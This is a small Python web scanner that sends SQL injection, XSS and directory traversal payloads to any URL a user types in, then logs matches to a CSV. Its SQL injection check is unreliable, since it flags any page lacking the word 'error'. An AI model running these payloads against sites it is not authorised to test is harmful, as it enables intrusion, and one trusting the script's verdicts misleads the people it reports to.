import requests
from urllib.parse import urljoin

def check_sql_injection(url):
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' or 1=1 limit 1 -- -+",
        "admin' or 1=1 or ''='",
        "'=' or '",
        "' or '1'='1'",
        "'hi' or 'a'='a'",
        "' or 'a'='a'"
    ]
    vulnerable = []
    for payload in payloads:
        target_url = f"{url}{payload}"
        response = requests.get(target_url)
        if "error" not in response.text.lower():  # Simplistic error-based detection
            vulnerable.append({"url": target_url, "payload": payload})
    return vulnerable

def check_xss(url):
    payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<script>alert("document.cookie")</script>',
        '<ScRipT>alert("1")</ScRipT>',
        '<img src=1 href=1 onerror="javascript:alert(1)"></img>'
    ]
    vulnerable = []
    for payload in payloads:
        target_url = f"{url}{payload}"
        response = requests.get(target_url)
        if payload in response.text:
            vulnerable.append({"url": target_url, "payload": payload})
    return vulnerable

def check_directory_traversal(url):
    payloads = ["../../etc/passwd", "../../../../../../windows/win.ini"]
    vulnerable = []
    for payload in payloads:
        target_url = urljoin(url, payload)
        response = requests.get(target_url)
        if "root:" in response.text or "[extensions]" in response.text:
            vulnerable.append({"url": target_url, "payload": payload})
    return vulnerable

def generate_report(vulnerabilities, output_file="report.csv"):
    import csv
    with open(output_file, mode='w', newline='') as file:
        writer = csv.writer(file)
        writer.writerow(["URL", "Vulnerability"])
        for vuln in vulnerabilities:
            writer.writerow([vuln['url'], vuln['payload']])

if __name__ == "__main__":
    url = input("Enter URL to scan: ")
    sql_vulns = check_sql_injection(url)
    xss_vulns = check_xss(url)
    dt_vulns = check_directory_traversal(url)

    all_vulns = sql_vulns + xss_vulns + dt_vulns

    if all_vulns:
        print(f"Vulnerabilities found: {all_vulns}")
        generate_report(all_vulns)
    else:
        print("No vulnerabilities found.")

    print("\nScan conducted by Yoga_Scan\nInstagram: @YogaGymn")
